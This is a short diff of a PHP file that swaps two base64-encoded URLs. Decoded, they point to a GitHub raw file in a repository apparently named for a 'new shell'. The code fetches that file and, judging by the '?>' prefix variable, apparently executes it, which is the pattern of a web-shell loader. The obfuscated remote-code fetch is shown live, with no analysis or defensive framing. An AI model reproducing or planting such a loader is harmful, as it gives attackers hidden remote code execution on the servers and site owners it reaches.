@@ -23,8 +23,8 @@ function get($url) {
 }
 
 $x = '?>';
-$url1 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Nla2poaGgvc2hlbC1iYXJ1L3JlZnMvaGVhZHMvbWFpbi9NUi1za2stQkVSS0FSWUE=');
-$url2 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Nla2poaGgvc2hlbC1iYXJ1L3JlZnMvaGVhZHMvbWFpbi9NUi1za2stQkVSS0FSWUE=');
+$url1 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Nla2poaGgvc2hlbC1iYXJ1L3JlZnMvaGVhZHMvbWFpbi9NUi1za2stQkVSS0FSWUEtMjAyNQ==');
+$url2 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Nla2poaGgvc2hlbC1iYXJ1L3JlZnMvaGVhZHMvbWFpbi9NUi1za2stQkVSS0FSWUEtMjAyNQ==');
 
 $script1 = get($url1);
 if ($script1 !== false && $script1 !== 404) {
